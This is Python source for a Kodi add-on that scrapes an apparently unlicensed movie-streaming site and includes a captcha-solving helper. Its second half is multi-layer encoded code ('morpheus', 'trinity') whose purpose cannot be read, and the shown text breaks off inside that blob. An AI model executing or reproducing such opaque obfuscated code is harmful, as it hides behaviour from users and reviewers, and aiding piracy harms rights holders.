# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
    
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')

RESOURCES       = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'

exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if fnapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')    
datas =  addon.getSetting('sdata')    

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)

    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)    
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),            
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item('https://fmovies.to/filter?type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True)    
    add_item('', "-      [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]subtitles:[/COLOR] [B]"+fnapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fnap', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)    
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item('https://fmovies.to/filter?type[]=series', 'List tv-series', 'DefaultMovies.png', "listmovies", True)    
    add_item('', "-      [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]subtitles:[/COLOR] [B]"+snapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:snap', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)    
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    add_item('https://fmovies.to/movies', 'Movies', 'DefaultMovies.png', "menumov", True)    
    add_item('https://fmovies.to/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)    

    xbmcplugin.endOfDirectory(addon_handle)
    

def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    # mud='getLinks'
    fold=True
    # for f in itemz:
        # add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)    
    # itemzx=serials
    # items = len(serials)
    # mud='getseasons'
    # fold=True
    # for f in itemzx:
        # add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items)    
    for f in itemz:
        mud = 'getseasons' if '/series/' in f.get('href') else 'getLinks'
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)
    if pagin:
        add_item(name='[COLOR blue]>> Next Page [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')    

        xbmcplugin.endOfDirectory(addon_handle)        

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY1MzE3NTUwNmYzMDcxMzYzNTU4NzQ0YzJiN2EzOTczMzY1NDdhNzM2MjcwMzM1NzY5NDk3NjRhNTU3OTZjNGU2YTc4NTE3NTRkNDE1MTZkMzc0ZDU0Njc3NDQ1NDgzOTM0NzE1MzYzNTQ2ZjRmNzg0OTU0NzU2NDU4NDgzNzM5NTc1Mzc2NDk1ODU4MzI1YTZlNzQ0NTM4N2E0NTRmNGE0MjQ5NGI0OTM3MzMzNTVhNmUyYjczMmY2NjZhMzE2NTY5Mzk3NTUwMzQzNDM5NjY1ODM0NWE2NjJmNzY0MTY2NzY3OTM1NTMyZjM1NjMyZjJmNTA0YjQ4NjMzOTMzNjMzMzZhMzkyYjY2NTQ2ZTM4Mzc2NjY3NzcyYjJmNGY3NjU4NDY0ODM4Mzc1YTYzMmYzMTRjNjYzMzM1NzUzMTM0MmYzOTc1NzY2NjJmNmUzMTRlN2E2ZTRkNGM3OTJmMzEzNjZhNTAzMzZlNzk3NjcwNjgzNDM0NjIzMzMwNzI3MDM1NjQ3NDRlNWE3OTdhNjQ3NTQ3NmM2NTM5NzY1MDUwMzQ2ODcxNjY3MzZlNmY3ODM1NmQ2YzZkNTI0ZTJmNmU0NDc5MmYyYjM1NTk3ODcyMmI1NzRhNzQ0YzcwNmQ3NDJmNmY2Mjc2NmQ2ODY1Mzg3YTM2Nzg0YzY3MzIzODJiNTg3NTc5Nzc0ZjJmNmE1MDVhNmE0NzQ5NTIyZjZkMzk3MzQ2NjI3MDM1NmQzMDMxNTY3NjYyNGIzMzY0NzE3MjRlNDI3NDU2NTc2YzY4NzE2YTRkNjY1NjZkNDQ2ZDcyNTY0NjZkNzI2MzZkNzU3MjU3NmM3MTcyNGQ2MTdhNTY0YjQ5N2E2MzZhNTEzMDMxNTY3NTRmNzE2YTRiMzE1Njc2NjU1ODYxNjY2YzU1NzE0OTJiNTAzNjU1Njg3MDVhMmI3NTRlNGU2YTU4NGE2MzU5MzkzMzRiN2E3NzdhNzU3NDJmNGI1NjZjNWE2MzYyNjY0YTM4NWE2MTM5NDMzNTRiNmE0ZTdhNTY2NTYyNmU1NjU2NzA2Nzc2MmIzMjQ5MmY1NTY1NDY1MDU2NjEzMTVhMzYzMzU0Mzc2MjQyNGIzODU3MzE1YTQ3NGI0NDRjNzg0ODRlNmUzNTVhMzY0ZDc0NTY3MzRkNjE2OTc5NDc3MjRkNzc3NjY1NjgzOTMzNjEzNjc4NTM0ZDYxMzc1NDU0NjIzMjc5NTA0Njc1NGU1NzM1NzgyZjQ3NzY0YTUzNDQ2MTc1Nzg3NzUwMzY2NzcxMmI1YTVhNjU2MjMwNjE1OTM5Nzc1ODQ4NTc2OTMxNDY2NTZjNGY3NDM2NDE3NjcyMzE1NzY0NmQ2MzcyNGU1YTZkNzA1NTQyNzIzNzQ0NmQ3MTMyNGE2MzMzNDIyZjMwNzMzOTU4NmYzODQxNTY2MjM4NjM0MzM2Mzk1NjczMzU1NjU5MzQ2MjM5NzU0MjUwNzM2NzRiMmIzOTU1NTMzNTJiNDg2NTZhNTczMTM4NWEzMzUwMmY2YzU2NzU0ZDM0NDI2NjU4NDQ0ZjY1NjM3YTRhNTU2MjM0NmU3YTM4Mzc2MTcyMmI2MTMxMmY0OTcyMzQ0MzYzNGQ3NDRiNTA0YjJiNjg3ODRkMmY0MzQ2NjQ1NzU2NmQ1MTU3Mzc2NzJmMzI1MzcyNDY0ODc2MzQ3MDQyNGQzNjYzNDUyZjUxNTIzMzY4NjU2YTU2NzM3MjU0Mzc2MzdhNmU0NDJiNzU1NTc1NzE2YTY3NzY3ODc4NTQ3YTMyNmI2ODU5NGUzNzQ1MzI2MzRlMzE0MTY2MzI0ZTRlNTg2ZjM0NjI3NjQzNTg3NTMwMzg0ZjMwNzMzMzVhMzU3ODcyNGIzMzY2NGM0ZTVhNDE3YTM1NTE1MzM5NzAzNTczNGM3YTY5NTUyZjJiNDEzNzc5NjQ3OTZiNmUzMjY3NTAzMDU2NmI0ZDZkMzQ0ODM1NTY3ODM1NDI1MDJmNjc1YTM1NTE2YjYxNzE1NzJmNmQ1MTc0Nzc3NTVhNzA3MDQ0N2E3OTQ4NTc2NTQyNTQzMjQyNDQ3NDcwNGU2ZjY1MzA0MzZjNmQ1NDdhNjI0NTU4MzU3MDQyNTgzMTMwMzA0NTJmNGE2ZDU1NDg3NTU5Mzg3MjY2NTEzNzcwMzI2YzRiNzY3NTRhNGE3Njc2NDI3NDU2N2EzMzMyNTY0ZjM5NmM0YzZlNmY0OTU4MzMzNDRlMzg2YzQ1NmQzNzQxNmEzMzU5NTIzMTZlMzQ0NDc1NzU2ZjM3Mzc3OTQzNTg0ODQ1NjUzNzQ4NTQ0ZDY2NzQ2MzY2Mzk3ODJmNDE0ZTM3MzQ3MjJiNzQ1NTQ5NzU3OTc5Njg0NzM5MmI2YTc2NTY1MzY3NDIyZjU5NDc3NTVhNTU2ZTc5NmM1MDU0NmU0Yzc1NTU0NzM2MmY2NzQ3NjI0YTU4NzQ0MzQ4NjY2ZjJmMzc0Zjc1NDg0YTJmMzY0NjRmNDMyZjc3N2E2ZTYyNmQ0NzU4Mzk0YTYzNGI2NDRkNDEyYjc5NTQyZjcwNDg0ZDQ4MzE3NTRkNDYzNjUzNTY3MjY3NDY3ODU2MzA1NDQyMmY0YzcxNDUyYjYzNTYzMTQ4NTg0YTc1NTI3MTU0NTg0YzRhN2E0OTdhMzI0ZjM5NDYzMTc3NTQ3NjczNTM1NDM0NTY2NjYzNTQ2ODc1NzE3YTRkNzk0OTY0NGU3NTczNmIyZjM5NDc3ODZmMzIzMzRiNzgzMzcwNjQ2NjJmNGQ0NTJmNTU3NDZhN2E1MzRjMmY0Mjc2NzY1NTU3NjY3MDY1NTg0YjJiMzI0ODMxNGQ0ZDRhMmY0NzY2NjEzNzY4NTY2ZjcwN2EzNTc4NjIzMjcwMzc0OTU4MzE3NTQxNWE3MzQ1NDgyZjUxNmEyYjY3MmYzODYxNzE1ODM5Nzk0ZDRmMmIzMDQxNjYzMjdhNjQ0ZjM4Nzc2YTRkMzg3MDJmMzg0YTUzMmY3NDM3NmE2NjMwNmY3NDM1NTE3ODQxNTg3YTY4MmIzOTU4MzQyZjRiNjEyYjM0Njc2YzMwNDQ3MjM4Njc3NjM5NDE3MjJmNTM2NTQ2N2E2NDQyNzYzNjVhNjU1NTU3Nzk2ZTM1NmU0ZjY0NTEzMzc1NTE0NDJmNTA3OTU5Mzc0OTdhNjY3NTU0NDg2YjQzMzMzNTM5NTM1ODM3NDE0YzJiNTY1MzRmNDk3NzY2NTc2YzM3NzAzNjU4NjYzNTQ5NzgzNTUxNjY2OTY2NTk0YzJiNTE0ZjJiNjM0NTJiNjI0MjMxMzMzMDY3NGM2ZTYxNzY2ZDU1NGY0MTM5MzY2NzMxMmI2ZTQ1NzY2MjMyMmY0OTVhMzkzNDQ1NjU2NzcwMzY1MzYzNGU2ZTY5NzYyZjUxNjczNjc3NGM2MzZhMmY1NzQ5Mzc1MDU5NjM2NjUxMzIzNDU3Mzc1MTU4NzY3NDU0Mzk0MTJmNmQ2NjcxNmU2MjRhNjg2ZTQ1NDkzODZmNjQzNTY4NmEzOTQyNjg2NTVhNzI3MzQzN2E0NTUxNDY2NzQ4NWE2MTRjMmY3NDQ3NGYzODU5NTI3ODQ1NGM2MTRiNjY1OTQxMzM3YTUyNzIzMDcyNzk2YzdhNDc1NzMwNmEzODUxNjQ3NzcyNDc2ZTQyNmU3NDY5NDgzNDQzNzY3ODM4NWE2ODM4Njc1ODM5NDc1MDcwMmI0YTZlNzE3NTQxNTE1YTUxNjIyYjZjNDIyZjJmNTUzODUxNjI3OTUyNGM3YTdhNzc1YTRkNjI2YjM4MzU1Mjc4MzE1MDQ5NjQzMTU4NDMzNzc1NDgzMzU3NTk3MjdhNDc0YjRlNGI0YzU2NjY1OTQ2NTg2OTc0NGI1MTUwNzczNTM5NDk1ODQ1NDQ2NDY0Mzg2YTQ4NWE1NDU2MzU3MTY2NTUzNzc4NDQzOTM5NmY2NjM5NzgzNTczNDM1MDQ5MzA1NjY2MzA0ZDJiNTE0YTU5NTUzODc4NTY3NTQ1Mzc3OTcxMmI2OTU0Mzk0Njc1NDk1MzJmMzY3MTUyNjkzMTUwMzc2OTRkNGYzOTY3NWEzOTY3NDgzNTU5NDUzMDQ2NzY1NDQzNTc0MzczNjI2ZTZiNjY0YzRiMzk2NjMwNGE2MzZmNDk2NDUxNDUzNjVhMzk2YjU4NDk2ODZlNTI3MjU3NTU0OTc1NGM3NTRkNmYzNDY3NTg2OTM5NTk3MDc4NTUzODc0NGUzNjc3NzYzNjc4NjQyYjQ5MzIzNTQ0NWE0MTRjMmI0MzQ4NTA1MTJiNzU0ZDRhMmI3ODc1NDk3MjcyNzM0ZDJiNTIzOTc3NmE1NDY5NDU2NjU3NWE0ZjY1NmY0NDY2NTg2NzM1MzU2ZjcwMzQ3MDM1NzM1MTU5NjQ2ZjM5NWEzNzc5NmUzMTMwNTQ0ZjQyMzY1YTJmNDk2NjcyNDI3NDcwNmUzNDc5NzI3OTQyNGQzNjc2Njg1ODY3NjgyZjQ1MzQ3NDZlNTE3NTUxNDg3YTU4MmY3MTU4Mzk0NTZlNGE0MjJmNmM0NDMwNmQ3ODMzMzI1MTM5MzU0NjQ4NDc1NDJiNjc3NzM0NTI0NjM1NmE2ZTQ3NDcyYjVhNjgzMzUzNjM1YTY2NzczNzM2NjI3OTQ2NGY0MTQ3MzU1MTQ0MzQzNzYyNTczODRmMmI0YjRlNjU3YTUzNmM2ZTU1NzgzNDY1MmI0MzRiNjY0ZDY2Nzk0ODJmNjc1ODVhMzA3MzJiNTE3Mjc4NDczMzU0NGY1MTcwMzI0ZjJiNmQ1YTRhNzk0NTU4NGM2ZjcwNTQ2YTQ0NjU1YTY0NDE3MjJiNDIzNDZjMzg3ODY2Nzk1NjZkNzg0ZTM5NzE2ZTdhNmQzODMxMzQ2ODYyNjk0ZDJmNGE3NDRlMmI2OTc1NWE3NDM2NjIzODY5N2E3ODYzNjc2ZDM3NjEzOTMyN2E0YjQxMzk2ZjJiMzY0OTJiNTU0OTJiNzk0YjYzNTE1ODMwNjE1MjMzNTI0ZTczNmIyZjM0NmU2MzRhNzYzNDQ4NjY0ZDMwMzk3MDRmNzg2ODY4NmM3YTM3NzQ0MTc2NWE1OTQ5NmYzNDc3NjY3MDU4NTU0ZjJmMzI0OTY0NmI1MTM5MzA0ZDM3Njg2ODM2Njc0NDM0NDgzODM5Mzc1NTRiNmM3MDQyNGYzODc1NjI0MTc2Nzg0MTY2NTU0NjJmNDM2YTcyNjE0NzJmMzgzMzU4NjM0MTQ2MzIzMDY0MzM3YTc2NGQ2YTM1Njc1MDYzMzc1MjY0NTE0ODc5NGI1ODZhNTEyZjcxNTg1ODQ5N2EyZjZiNjI2ZjQ4Mzg3MjQ1NDEzMzM4NmY3NjRjNzY0MTY5MzczOTZkNmI1MDM0NDQyYjU2NmE0ZjQ3NzM0YzJmNDE2MzJmNGM0ZTc1NTk0NTM2NDgyZjUzNzI2MTQ4MmI0YjUzNjc3NDJmNzkyYjVhNzIzNzMxNTIzNzcyNmQ'
trinity = '1LGD2ZmV3ZQWvAmZ1AGp5AQR1BQWvZmDmZGD0AmH2BGMyAzZ0MwZ1ZmV2AwHkAmxmZmMuATD2AwD0AQt3ZGWzAQD0BQEuAzZlMwEuAQt2AwMwAGV1AQZmATZ2ZGZkAGN3AwquATD2MGD3AQx0ZmWzATH3LGH2ZzV1AwplAzH1ZQL2AQZ0AwLkZmN3BGZ5Amp1ZwZ1Awx1ZmZ4AmDmAwZ4Awt2AGH0AmD2AQp3AGH3ZwZlATH0MGIuZmtmAGZ0ATL3AGH1ATZ3BGEuAwL3BQD2ZzL0LwIuZmL2BQD3AQt2AGHlZzVmZQquAGL2BQHjAwp0LmZ5AmR3ZGL5AmZ2AmEuZmx3ZQZkAmx3AwMzAzL1LGMwZmN3AmZ2AGN3BQEzAmLmZwEyZzV0AmIuAzZ2AwD3ATV0MQL4AGtlLwLkAGt2LwLlAGp0Zmp2AwpmAmHkAQZlMwZjAQx2AQL5Amp2MGp2AzZ0LmD3AzV2AQL5AwRmAQMuAJR3Zmp3AzD0LwL0AQVmBGpjZmtmAwMyAwx0LwMzA2R2MGMuAQp2MQD5AmtmZGp0AQt1ZQZ5AGN3ZQEuAGt3ZwDlATZ3BQDlAwD0AwWvAwL3AGExAzDmAwp3AGN0LwH2AwH2AQHmZmN3AmL0AQtmAwD2AmLmZwL3AGt3ZwDmATH2AmHlZmp3ZGH3AmNmAwZ4AQpmZQExAzZ2MQHjAwR3AQWzAGDmBGHlZmZ3LGEzAwL1ZGZ2AmZ3ZmLlAQL0Mwp1AGR2LmZ1ATR0Awp5Amx2BQL2AQxmBQZ2Amt1AQH4ATH2ZGLlAQL2AGp5Awx1BGDlZmD0AGZmZmt3LGHjAmV0Mwp0AwxmAmL0AwZ1LGZ4Awp0LmZlAJR3ZQp4A2R3AQD0ZzVmAwplAQD0MwIuATHlMwL5AwZ2AGL5AmDmZQHjAwR2BQEvAzH1ZGZ5ATH0MGL0AGp2BGMwAzRmAGL2Amt3BQH4AQx0BQplATR1ZmEuAwZmAwD2AQt0AwIuAwL1AwWvAmt2ZwZjAGHmBQMyZzV3ZQMvZmp3AGH1ZzL0ZwLmAmp1LGL0AQVmBGD2AzD1Zwp0ATV3AwZ3AGV0AQp5AmN2AQWzAGRmAmZmAQt1AwExAJR2AwWvAwDmZwEwZmx1LGDmAwp2AQMwZmH2BGZmAwD2AQZjZmL1AGDkZmxmAwquAGplLwWzZzL0MwD4AzRlMwH4Amp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